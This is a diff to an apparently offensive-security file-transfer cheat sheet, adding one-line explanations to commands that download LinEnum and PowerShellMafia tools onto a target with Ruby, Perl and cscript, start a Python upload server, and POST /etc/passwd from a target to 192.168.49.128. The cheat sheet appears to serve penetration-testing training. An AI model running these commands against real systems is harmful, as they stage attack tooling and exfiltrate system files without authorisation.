@@ -69,6 +69,7 @@ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/mas
 ```bash
 ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
 ```
+> Uses Ruby's Net::HTTP to download a file when wget/curl are unavailable; swap the URL and the output filename.
 
 ---
 
@@ -77,6 +78,7 @@ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("h
 ```bash
 perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
 ```
+> Uses Perl's LWP::Simple to download a file as another language fallback; swap the URL and the output filename.
 
 ---
 
@@ -173,6 +175,7 @@ cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/P
 ```bash
 python3 -m uploadserver
 ```
+> Starts a Python upload server on the default port 8000 with a /upload endpoint to receive files; pass a port number to change it.
 
 ```
 File upload available at /upload
@@ -184,6 +187,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```bash
 python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
+> One-liner that POSTs a file from the target to your upload server; swap the URL and the local file path to exfiltrate.
 
 #### Step 2 Breakdown (Multi-Line for Understanding)
 
